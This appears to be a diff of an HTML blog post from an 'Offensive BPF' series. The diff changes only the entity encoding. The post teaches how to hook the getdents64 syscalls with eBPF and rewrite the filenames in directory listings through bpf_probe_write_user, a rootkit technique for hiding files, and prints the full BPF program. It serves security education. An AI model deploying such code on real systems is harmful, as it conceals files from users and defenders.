@@ -181,7 +181,7 @@
     __uint(max_entries, 8192);
     __type(key, tid_t);
     __type(value, u64);
-} dir_entries SEC(&quot;.maps&quot;);
+} dir_entries SEC(&#34;.maps&#34;);
 </code></pre><p>This defines the structure of the map using the <code>SEC</code> macro.</p>
 <h3 id="hook-points-trace-points-and-probes">Hook points, trace points and probes</h3>
 <p>Reading through <a href="https://xcellerator.github.io/posts/linux_rootkits_06/">Linux Rootkits Part 6 - Hiding Directories</a> I learned that I needed to leverage <code>getdents64</code> syscalls to access or manipulate directory listings. This is also needed if one wants to build a rootkit.</p>
@@ -198,7 +198,7 @@ tracepoint:syscalls:sys_exit_getdents64
     long ret;
 </code></pre><p>The man page <code>man getdents64</code> contains further details and explanations.</p>
 <p>The code to hook <code>sys_enter_getdents64</code> is short - here is entire snippet:</p>
-<pre tabindex="0"><code>SEC(&quot;tracepoint/syscalls/sys_enter_getdents64&quot;)
+<pre tabindex="0"><code>SEC(&#34;tracepoint/syscalls/sys_enter_getdents64&#34;)
 int handle_enter_getdents64(struct trace_event_raw_sys_enter *ctx)
 {
     tid_t tid = bpf_get_current_pid_tgid();
@@ -226,7 +226,7 @@ int handle_enter_getdents64(struct trace_event_raw_sys_enter *ctx)
 <h2 id="hooking-the-exit-call-and-manipulating-filenames">Hooking the exit call and manipulating filenames</h2>
 <p>Let&rsquo;s walk through the code of the exit function.</p>
 <p>First, I defined the hook point for the <code>sys_exit_getdents64</code> trace point.</p>
-<pre tabindex="0"><code>SEC(&quot;tracepoint/syscalls/sys_exit_getdents64&quot;)
+<pre tabindex="0"><code>SEC(&#34;tracepoint/syscalls/sys_exit_getdents64&#34;)
 int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
 {
 </code></pre><p>Next, we grab the thread group ID that we can use as identifier for the call going forward.</p>
@@ -250,14 +250,14 @@ int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
     long unsigned int d_entry_base_addr = *dir_addr;
     long              ret               = ctx-&gt;ret;
 
-    //MAX_D_NAME_LEN == 128 - const isn't working with allocation here...
+    //MAX_D_NAME_LEN == 128 - const isn&#39;t working with allocation here...
     char d_name[128];  
 </code></pre><p><code>ctx-&gt;ret</code> is the return value of the <code>getdents64</code> call and contains the overall length of the buffer, <code>d_entry_base_addr</code> is pointing to the beginning of that buffer.</p>
 <p>Let&rsquo;s start the loop.</p>
 <pre tabindex="0"><code>    int i=0;
     while (i &lt; 256)   // limitation for now, only examine the first 256 entries
     {
-        bpf_printk(&quot;Loop %d: offset: %d, total len: %d&quot;, i, offset, ret);
+        bpf_printk(&#34;Loop %d: offset: %d, total len: %d&#34;, i, offset, ret);
 
         if (offset &gt;= ret)
         {
@@ -283,17 +283,17 @@ int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
             continue;
         }
 
-        bpf_printk(&quot;d_reclen: %d, d_name_len: %d, %s&quot;, d_reclen, d_name_len, d_name);
+        bpf_printk(&#34;d_reclen: %d, d_name_len: %d, %s&#34;, d_reclen, d_name_len, d_name);
 </code></pre><p>You can also read <code>d_type</code> and make sure it is not equal to <code>DT_DIR</code> (4) to skip directories and only manipulate filenames.</p>
 <p>The next step is the logic to only overwrite a file that matches a certain string, etc. To keep the example here straight forward the code just targets every filename that is longer than 6 characters and overwrite the initial 6 characters with <code>OhBPF</code> using <code>bpf_probe_write_user</code>. :)</p>
 <pre tabindex="0"><code>        if ( d_name_len &gt; 6 )
         {	
-            bpf_printk(&quot;** sys_enter_getdents64 ** OVERWRITING&quot;); 		
+            bpf_printk(&#34;** sys_enter_getdents64 ** OVERWRITING&#34;); 		
             
-            char replace[6] = &quot;OhhBPF&quot;;
+            char replace[6] = &#34;OhhBPF&#34;;
 
             long success = bpf_probe_write_user((char *) &amp;d_entry-&gt;d_name, (char *) replace, sizeof(replace));
-            bpf_printk(&quot;** RESULT %d&quot;, success);  
+            bpf_printk(&#34;** RESULT %d&#34;, success);  
         }
 </code></pre><p>Finally, we increase the <code>offset</code> by the record length (<code>d_reclen</code>) to move to the next directory entry, and in case we reached the end of the loop we return.</p>
 <pre tabindex="0"><code>        offset += d_reclen;
@@ -330,19 +330,19 @@ int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
 <p>This is the core source code of the BPF program discussed in this post. I will release the repo once I complete the Offensive BPF series - since there is still a lot of code churn and changes.</p>
 <pre tabindex="0"><code>// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
 
-#include &quot;vmlinux.h&quot;
+#include &#34;vmlinux.h&#34;
 #include &lt;bpf/bpf_helpers.h&gt;
 #include &lt;bpf/bpf_tracing.h&gt;
 #include &lt;bpf/bpf_core_read.h&gt;
-#include &quot;obpf.h&quot;
+#include &#34;obpf.h&#34;
 
-char LICENSE[] SEC(&quot;license&quot;) = &quot;Dual BSD/GPL&quot;;
+char LICENSE[] SEC(&#34;license&#34;) = &#34;Dual BSD/GPL&#34;;
 
 struct
 {
     __uint(type, BPF_MAP_TYPE_RINGBUF);
     __uint(max_entries, 256 * 1024);
-} rb SEC(&quot;.maps&quot;);
+} rb SEC(&#34;.maps&#34;);
 
 struct
 {
@@ -350,14 +350,14 @@ struct
     __uint(max_entries, 8192);
     __type(key, tid_t);
     __type(value, u64);
-} dir_entries SEC(&quot;.maps&quot;);
+} dir_entries SEC(&#34;.maps&#34;);
 
 const int            MAX_D_NAME_LEN = 128;
 const volatile char* PATTERN;
 const char           DT_DIR = 4;
 //const char           DT_REG = 8;
 
-SEC(&quot;tracepoint/syscalls/sys_enter_getdents64&quot;)
+SEC(&#34;tracepoint/syscalls/sys_enter_getdents64&#34;)
 int handle_enter_getdents64(struct trace_event_raw_sys_enter *ctx)
 {
     tid_t tid = bpf_get_current_pid_tgid();
@@ -373,7 +373,7 @@ int handle_enter_getdents64(struct trace_event_raw_sys_enter *ctx)
     return 0;
 }
 
-SEC(&quot;tracepoint/syscalls/sys_exit_getdents64&quot;)
+SEC(&#34;tracepoint/syscalls/sys_exit_getdents64&#34;)
 int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
 {
     struct task_struct *task;
@@ -399,7 +399,7 @@ int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
     long unsigned int d_entry_base_addr = *dir_addr;
     long              ret               = ctx-&gt;ret;
 
-    //MAX_D_NAME_LEN == 128 - const isn't working with allocation here...
+    //MAX_D_NAME_LEN == 128 - const isn&#39;t working with allocation here...
     char d_name[128];  
     int  count = 16;
     char d_type;
@@ -407,7 +407,7 @@ int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
     int i=0;
     while (i &lt; 256)   // limitation for now, only examine the first 256 entries
     {
-        bpf_printk(&quot;Loop %d: offset: %d, total len: %d&quot;, i, offset, ret);
+        bpf_printk(&#34;Loop %d: offset: %d, total len: %d&#34;, i, offset, ret);
 
         if (offset &gt;= ret)
         {
@@ -419,7 +419,7 @@ int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
         // read d_reclen
         bpf_probe_read_user(&amp;d_reclen, sizeof(d_reclen), &amp;d_entry-&gt;d_reclen);
 
-        // skip if it's a directory entry
+        // skip if it&#39;s a directory entry
         bpf_probe_read_user(&amp;d_type, sizeof(d_type), &amp;d_entry-&gt;d_type);
         if (d_type == DT_DIR)
         {
@@ -438,18 +438,18 @@ int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
             continue;
         }
 
-        bpf_printk(&quot;d_reclen: %d, d_name_len: %d, %s&quot;, d_reclen, d_name_len, d_name);
+        bpf_printk(&#34;d_reclen: %d, d_name_len: %d, %s&#34;, d_reclen, d_name_len, d_name);
 
         /* match and overwrite */
         if ( d_name_len &gt; 6 )
         {	
-            bpf_printk(&quot;** sys_enter_getdents64 ** OVERWRITING&quot;); 		
+            bpf_printk(&#34;** sys_enter_getdents64 ** OVERWRITING&#34;); 		
             
-            char replace[] = &quot;xxxxxx&quot;;
+            char replace[] = &#34;xxxxxx&#34;;
            
             // overwrite the user space d_name buffer
             long success = bpf_probe_write_user((char *) &amp;d_entry-&gt;d_name, (char *) replace, sizeof(char) * 6);
-            bpf_printk(&quot;** RESULT %d&quot;, success);  
+            bpf_printk(&#34;** RESULT %d&#34;, success);  
         }
 
         offset += d_reclen;
